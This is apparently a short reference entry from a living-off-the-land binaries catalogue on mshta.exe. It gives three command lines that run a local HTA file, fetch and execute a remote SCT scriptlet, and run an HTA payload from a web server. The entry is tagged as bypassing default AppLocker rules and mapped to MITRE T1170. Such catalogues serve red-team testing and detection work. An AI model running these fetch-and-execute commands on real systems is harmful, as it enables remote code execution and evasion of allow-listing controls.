## Mshta.exe
```

mshta.exe C:\poc\evilfile.hta
Executes code inside evilfile.hta.

mshta.exe javascript:a=GetObject("script:https://gist.github.com/someone/something.sct").Exec();close();
Executes remote SCT file

mshta.exe http://webserver/payload.hta
Executes hta file from external webserver
```
* Windows binary: True   
* Bypasses Default AppLocker Rules: True   
* Mitre: [T1170](https://attack.mitre.org/wiki/Technique/T1170)   
   
* Links:   
  * https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1170/T1170.md
  * https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_4
  * https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/mshta.sct
  * https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/
  * https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/
   
* File path:   
  * C:\Windows\System32\mshta.exe
  * C:\Windows\SysWOW64\mshta.exe
   
* Acknowledgement:   
  * Name: Casey Smith
    * Twitter: [@Subtee](https://twitter.com/@Subtee)
    * Blog: https://subt0x11.blogspot.com/
   
OS:  
